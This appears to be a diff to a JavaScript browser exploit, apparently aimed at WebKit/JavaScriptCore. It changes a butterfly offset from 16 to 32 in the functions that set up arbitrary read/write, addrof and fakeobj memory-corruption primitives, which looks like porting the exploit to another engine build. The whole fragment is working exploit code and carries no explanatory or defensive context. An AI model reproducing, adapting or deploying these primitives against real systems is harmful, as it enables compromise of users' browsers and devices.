@@ -112,7 +112,7 @@ function setupRW() {
 	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
+	if(!read64(g_jsview_butterfly.sub(32)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
 
@@ -148,11 +148,11 @@ function write64(addr, data) {
 
 function addrof(obj) {
 	g_ab_slave.leakme = obj;
-	return read64(g_jsview_butterfly.sub(16));
+	return read64(g_jsview_butterfly.sub(32));
 }
 
 function fakeobj(addr) {
-	write64(g_jsview_butterfly.sub(16), addr);
+	write64(g_jsview_butterfly.sub(32), addr);
 	return g_ab_slave.leakme;
 }
 
